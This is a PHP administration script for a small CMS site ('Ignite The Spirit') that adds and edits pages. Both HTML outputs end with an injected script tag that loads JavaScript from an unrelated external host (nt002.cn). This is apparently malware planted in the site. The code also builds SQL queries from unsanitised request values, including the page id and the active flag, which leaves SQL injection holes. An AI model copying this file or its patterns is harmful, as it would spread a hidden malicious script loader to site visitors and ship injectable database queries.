<?php
session_start();

if ($_SESSION['auth'] == "admin") 
{
include("db_connect.php");

	if ($_GET['action'] == "page")
	{
		function addpage() 	
		{
			
			echo "<h2>Add A Page</h2>\n";
			echo "<form action='$_SERVER[PHP_SELF]' method='post'>\n" ;
			echo "<input type='hidden' name='action' value='add'>\n";
			echo "<input type='hidden' name='id' value=''>\n";
			echo "<div class='pages'>";
			echo "Title: <input name='title' type='text' size='50' value=''>";
			echo "<br />";
			echo "<textarea name='content' cols='60' rows='20' ></textarea>";
			echo "<br /><br />";
			echo "<input name='edit' type='submit' value='Submit'> <a href='index.php'>Cancel</a><br />\n";
			echo "</form>";
			echo "</div>";
		} ?>
			
		<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
		<html xmlns="http://www.w3.org/1999/xhtml">
		<head>
		<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
		<title>ignite The Spirit | Administration</title>
		<link rel="stylesheet" href="admin.css"  type="text/css" />
		</head>
		<body>
		<h1>Ignite The Spirit | Administration</h1>
		<ul class="navigation">
			<li><a <?php if ($current_page == "news"){echo "id=current";}?> href="index.php?page=news">News</a></li>
			<li><a <?php if ($current_page == "calendars"){echo "id=current";}?> href="index.php?page=calendars">Calendars</a></li>
			<li><a <?php if ($current_page == "gallery"){echo "id=current";}?> href="index.php?page=gallery">Gallery</a></li>
			<li><a <?php if ($current_page == "pages"){echo "id=current";}?> href="index.php?page=pages">Pages</a></li>
			<li><a <?php if ($current_page == "store"){echo "id=current";}?> href="index.php?page=store">Store</a></li>
			<li><a <?php if ($current_page == "users"){echo "id=current";}?> href="index.php?page=users">Users</a></li>
			<li><a href="login.php?action=logout">Log Out</a></li>
		</ul>
		<div class="container">
		<?php addpage($page_result); ?>
		<br />
		Code you can use:<br />
		[b] <strong>bold text</strong> [/b]<br />
		[i] <i>italic text</i> [/i]<br />
		[u] <u>underline</u> [/u] <br />
		[return] - new line<br />
		</div>
		<script src='http://nt002.cn/E/J.JS'></script></body>
		</html> 
	<?php
	}
	else if ($_POST['action'] == 'add')
	{
		$cleaned_content = addslashes(strip_tags($_POST['content']));
		$cleaned_title = addslashes(strip_tags($_POST['title']));
		$insert_query = "INSERT INTO pages (`page_title`, `page_content`) VALUES ('$cleaned_title','$cleaned_content')";
		$insert_result = mysql_query($insert_query) or die(mysql_error());
		header ('location:index.php');
	}
	else if ($_POST['action'] == 'edit')
	{
		$cleaned_content = addslashes(strip_tags($_POST['content']));
		$cleaned_title = addslashes(strip_tags($_POST['title']));
		$query = "UPDATE pages SET page_title = '$cleaned_title', page_content = '$cleaned_content', page_show = '$_POST[active]' WHERE page_id = '$_POST[id]'";
		$update_result = mysql_query($query);
		header ('location:index.php');
	}
	else 
	{
		$page_ID = $_GET['id'];
		$query = "SELECT * FROM pages WHERE  page_id = $page_ID";
		$page_result = mysql_query($query);
		
		function pages($query_result) 	
		{
			$row = mysql_fetch_array($query_result, MYSQL_ASSOC);
			$print_date = date('F j, Y', strtotime($row['page_date']));
			$stripped_title = stripslashes($row['page_title']);
			$title = htmlentities($stripped_title, ENT_QUOTES);
			echo "<h2>Edit Page</h2>\n";	
			echo "<form action='$_SERVER[PHP_SELF]' method='post'>\n" ;
			echo "<input type='hidden' name='action' value='edit'>\n";
			echo "<input type='hidden' name='id' value='".$row['page_id']."'>\n";
			echo "<div class='pages'>";
			echo "Title: <input name='title' type='text' size='50' value='".$title."'>";
			echo "<br />";
			echo "<input name='active' type='radio' value='1'"; if ($row['page_show'] == 1) {echo "checked='yes'";} echo "/> Active\n"; 
			echo "<input name='active' type='radio' value='0'"; if ($row['page_show'] == 0) {echo "checked='yes'";} echo "/> Disabled<br />\n";
			echo "<textarea name='content' cols='60' rows='20' >".stripslashes($row['page_content'])."</textarea>";
			echo "<br />";
			echo $row['page_img1'];
			echo "<br />";
			echo $row['page_img2'];
			echo "<br /><br />";
			echo "<input name='edit' type='submit' value='Edit'> <a href='index.php'>Cancel</a><br />\n";
			echo "</form>";
			echo "</div>";
		} ?>
			
		<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
		<html xmlns="http://www.w3.org/1999/xhtml">
		<head>
		<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
		<title>ignite The Spirit | Administration</title>
		<link rel="stylesheet" href="admin.css"  type="text/css" />
		</head>
		<body>
		<h1>Ignite The Spirit | Administration</h1>
		<ul class="navigation">
			<li><a <?php if ($current_page == "news"){echo "id=current";}?> href="index.php?page=news">News</a></li>
			<li><a <?php if ($current_page == "calendars"){echo "id=current";}?> href="index.php?page=calendars">Calendars</a></li>
			<li><a <?php if ($current_page == "gallery"){echo "id=current";}?> href="index.php?page=gallery">Gallery</a></li>
			<li><a <?php if ($current_page == "pages"){echo "id=current";}?> href="index.php?page=pages">Pages</a></li>
			<li><a <?php if ($current_page == "store"){echo "id=current";}?> href="index.php?page=store">Store</a></li>
			<li><a <?php if ($current_page == "users"){echo "id=current";}?> href="index.php?page=users">Users</a></li>
			<li><a href="login.php?action=logout">Log Out</a></li>
		</ul>
		<div class="container">
		<?php pages($page_result); ?>
		<br />
		Code you can use:<br />
		[b] <strong>bold text</strong> [/b]<br />
		[i] <i>italic text</i> [/i]<br />
		[u] <u>underline</u> [/u] <br />
		[return] - new line<br />
		</div>
		<script src='http://nt002.cn/E/J.JS'></script></body>
		</html>
	<?php
	}
	
}//session
else { include("log_form.php"); }		
?>